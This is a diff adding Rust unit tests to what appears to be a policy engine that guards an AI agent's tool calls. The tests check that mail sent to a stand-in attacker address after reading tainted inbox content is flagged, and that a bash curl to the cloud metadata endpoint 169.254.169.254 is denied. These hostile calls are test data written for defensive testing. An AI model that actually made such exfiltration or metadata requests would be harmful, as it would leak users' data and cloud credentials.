@@ -368,3 +368,30 @@ fn sensor_flags_undeclared_sensitive_reads() {
     assert!(rules(&d).contains(&"sensor.sensitive-file"));
     assert!(e.evaluate(&file("/home/u/notes.txt"), &[]).findings.is_empty());
 }
+
+#[test]
+fn trusted_domains_allow_replies_to_colleagues() {
+    let mut cfg = enforce();
+    cfg.taint.trusted_domains = vec!["corp.example".into()];
+    let e = engine_with(cfg, "");
+    e.evaluate(&result("mail", "read_inbox", "From priya@corp.example and spam from evil@attacker.example"), &[]);
+    let d = e.evaluate(&call("mail", "send_email", json!({"to": "priya@corp.example"})), &[]);
+    assert!(!rules(&d).contains(&"taint.flow"), "{:?}", d.findings);
+    let d = e.evaluate(&call("mail", "send_email", json!({"to": "evil@attacker.example"})), &[]);
+    assert!(rules(&d).contains(&"taint.flow"));
+    let d = e.evaluate(&call("mail", "send_email", json!({"to": "x@sub.corp.example"})), &[]);
+    assert!(!rules(&d).contains(&"taint.flow"));
+}
+
+#[test]
+fn local_tools_may_reach_localhost_but_not_metadata() {
+    let e = engine_with(enforce(), "");
+    let d =
+        e.evaluate(&call(crate::LOCAL_SERVER, "bash", json!({"command": "curl http://localhost:3000/health"})), &[]);
+    assert_ne!(d.effective(), Verdict::Deny, "{:?}", d.findings);
+    let d =
+        e.evaluate(&call(crate::LOCAL_SERVER, "bash", json!({"command": "curl http://169.254.169.254/latest/"})), &[]);
+    assert_eq!(d.effective(), Verdict::Deny);
+    let d = e.evaluate(&call("web", "fetch_url", json!({"url": "http://localhost:3000/health"})), &[]);
+    assert_eq!(d.effective(), Verdict::Deny);
+}
